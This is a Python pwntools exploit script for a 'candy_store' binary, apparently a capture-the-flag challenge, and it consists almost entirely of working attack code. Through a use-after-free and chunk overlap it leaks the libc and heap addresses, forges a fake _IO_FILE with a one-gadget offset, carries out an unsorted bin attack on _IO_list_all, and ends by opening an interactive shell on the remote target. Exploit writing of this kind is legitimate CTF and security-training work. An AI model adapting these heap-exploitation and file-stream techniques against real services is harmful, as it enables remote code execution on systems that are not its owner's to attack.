#!/usr/bin/env python
import sys, os
from pwn import *

HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('localhost', 5566)
elf = ELF('candy_store'); context.word_size = elf.elfclass
with context.local(log_level='ERROR'):
    libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc
if not libc: log.warning('Cannot open libc.so.6')

def create_account(user, pw):
    r.sendafter('> ', user.ljust(8, '\x00'))
    r.sendafter('> ', pw.ljust(8, '\x00'))
    r.sendlineafter('No\n', '0')
    r.sendafter('ID.\n', user.ljust(8, '\x00'))
    r.sendafter('Password.\n', pw.ljust(8, '\x00'))
    r.sendlineafter('profile.\n', '')

def login(user, pw):
    r.sendafter('> ', user.ljust(8, '\x00'))
    r.sendafter('> ', pw.ljust(8, '\x00'))

def stock():
    r.sendlineafter('Command : ', '1')

def purchase(code, num, comment):
    r.sendlineafter('Command : ', '2')
    r.sendlineafter('purchased.\n', str(code))
    r.sendlineafter('purchase.\n', str(num))
    r.sendlineafter('candy.\n', comment)

def charge(amount):
    r.sendlineafter('Command : ', '3')
    r.sendlineafter('100000\n', str(amount))

def logout():
    r.sendlineafter('Command : ', '9')
    r.sendlineafter('No\n', '0')

class Order:
    def __enter__(self):
        r.sendlineafter('Command : ', '4')
        return self

    def __exit__(self, exc_type, exc_value, traceback):
        r.sendlineafter('Command : ', '5')

    def list(self, leak=False):
        r.sendlineafter('Command : ', '1')

        if leak:
            r.recvuntil('code  : ')
            return r.leak()

    def add(self, code):
        r.sendlineafter('Command : ', '2')
        r.sendlineafter('>', str(code))

    def cancel(self, idx):
        r.sendlineafter('Command : ', '3')
        r.recvregex('code: [0-9]\n')
        r.sendline(str(idx))

    def order(self, candies):
        r.sendlineafter('Command : ', '4')
        r.sendlineafter('No\n', '0')

        for candy in candies:
            r.sendlineafter('candy.\n', str(candy['price']))
            r.recvuntil('candy.\n')
            r.sendline(candy['desc'], 0x7c)

class Account:
    def __enter__(self):
        r.sendlineafter('Command : ', '5')
        return self

    def __exit__(self, exc_type, exc_value, traceback):
        r.sendlineafter('Command : ', '3')

    def delete(self, idx):
        r.sendlineafter('Command : ', '1')
        r.sendlineafter('delete\n', str(idx))

    def chpw(self, idx, pw):
        r.sendlineafter('Command : ', '2')
        r.sendlineafter('PW\n', str(idx))
        r.recvuntil('Password.\n')
        r.sendline(pw, 8)

r = remote(HOST, PORT)
pause()

# leak libc base
create_account('acc2', 'acc2')
create_account('acc3', 'acc3')
login('Admin', 'admin')
with Account() as account:
    account.delete(2)
with Order() as order:
    order.add(0)
    libc_base = (order.list(leak=True) - 0x3c4b00) & 0xffffffffff00
    log.info('libc_base: {}'.format(hex(libc_base)))
    libc.address += libc_base

# recover heap
with Order() as order:
    order.cancel(0)
with Account() as account:
    account.delete(3)

# leak heap base from fastbin
with Order() as order:
    order.add(0); order.add(0); order.add(0)
    order.cancel(0); order.cancel(0)
    order.add(0); order.cancel(0)
    heap_base = (order.list(leak=True) - 0x1100) >> 8 << 8
    log.info('heap_base: {}'.format(hex(heap_base)))
## recover heap
with Order() as order:
    order.cancel(0)

# prepare fake chunk
fuck = libc.sym['_IO_list_all'] - 0x10
vtable_addr = libc_base + 0x3c37a0 # _IO_str_jumps
## _IO_FILE
fake_chunk = flat(0, 0x61, 0, heap_base + 0x1270)
fake_chunk += p64(0) + p64(1) + p64(0)*6 + p64(0) + p64(0x21) + p64(0)*3 + p64(0x11) + p64(0) + p64(fuck) + p64(heap_base + 0x12a0) + p64(0)
fake_chunk += p64(0) + p64(0)*3 + p64(1) + p64(vtable_addr)
fake_chunk += p64(libc_base + 0x4526a)

with Order() as order:
    order.add(0)
    candies = []
    candies.append({'price': 0, 'desc': ''})
    order.order(candies)
purchase(0, 10, fake_chunk)

# overlap an unsorted bin and account[2]
logout()
create_account('acc2', 'acc2')
create_account('acc3', 'acc3')
login('Admin', 'admin')
with Account() as account:
    account.delete(2)
    account.delete(3)

## gen fastbin * 9
with Order() as order:
    for i in range(9):
        order.add(0)
    candies = []
    candies.append({'price': 0, 'desc': ''})
    order.order(candies)

logout()
create_account('acc2', 'acc2')
login('Admin', 'admin')
with Account() as account:
    account.delete(2)
logout()
create_account('acc2', 'acc2')
login('Admin', 'admin')

# unsorted bin attack
fake_chunk_addr = heap_base + 0x11f0
with Account() as account:
    account.chpw(3, flat(fake_chunk_addr))

# shell out
logout()
create_account('acc3', 'acc3')
login('Admin', 'admin')
with Order() as order:
    order.add(9)
    r.interactive()
